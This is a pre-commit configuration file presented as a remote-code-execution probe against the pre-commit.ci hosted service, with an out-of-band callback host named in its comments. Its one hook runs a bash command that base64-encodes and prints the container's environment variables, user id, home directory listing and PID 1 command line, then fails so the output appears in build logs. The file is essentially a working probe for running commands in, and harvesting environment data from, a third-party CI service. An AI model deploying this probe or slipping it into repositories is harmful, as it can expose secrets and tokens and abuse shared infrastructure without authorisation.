# rcexec probe — pre-commit.ci SaaS
# Surface: language: system hooks execute raw shell in pre-commit.ci containers
# OOB: dba7in09drvebvvemiogs53d1at9mapqp.oast.pro
# Probe ID: PRECOMMIT-001
# Replace OOB_HOST with your live interactsh hostname before use

repos:
  - repo: local
    hooks:
      - id: rcexec-probe
        name: rcexec-probe
        language: system
        entry: >-
          bash -c 'echo "RCEXEC:env=$(env | base64 -w0):id=$(id):pwd=$(pwd):ls=$(ls /home/pcrunner/ 2>/dev/null | base64 -w0):proc=$(cat /proc/1/cmdline 2>/dev/null | base64 -w0)" && exit 1'
        files: ''
        pass_filenames: false
        always_run: true
